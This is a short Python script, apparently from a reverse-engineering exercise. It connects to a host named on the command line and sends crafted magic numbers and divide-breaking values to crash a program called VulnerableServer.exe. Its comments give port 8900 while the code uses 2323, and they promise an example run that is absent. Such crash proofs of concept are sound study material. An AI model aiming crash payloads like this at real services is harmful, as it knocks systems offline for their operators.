import socket
import sys
import struct

'''
Please see an example run at the bottom of this file
'''


HOST = sys.argv[1] #'172.16.225.201'    # The remote host
PORT = 2323   # The same port as used by the server

#
# Create a socket..
# We use AF_INET : Address Family Internet (TCP/IP)
# We use SOCK_STREAM : This is connection-oriented (e.g. TCP)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

#
# Ignoring erors, we will attempt to connect to the 
# host, HOST, on port, PORT
# From our RE of VulnerableServer.exe, we know that it listens
# on port 8900.
s.connect( (HOST,PORT) )

# Total of 28 bytes being send to crash the program

m = int(sys.argv[2])
# magic number # 1
data = b'\x45\x4D\x4F\x48'

s.sendall( data )
# magic number # 2
data = b'\x4B\x52\x4F\x57'

s.sendall( data )

# m = input number which is used in the first idiv m/0x18
# the remained tells us how much to shift by ([ebp+edx+var_2C])
#\xFF\xFF\xFF'+b'\xFF represents the data which breaks the second idiv becaue its > 2^32 -1 
data = struct.pack("<L",m) + b'\x00\xFF\xFF\xFF'+b'\xFF\x00\x00\x00'
s.sendall(data)

# \x00\x80\x00\x00 representes non zero padding 
# magic number 695744h
data =b'\x00\x80\x00\x00'+b'\x44\x57\x69\x00'
s.sendall(data)


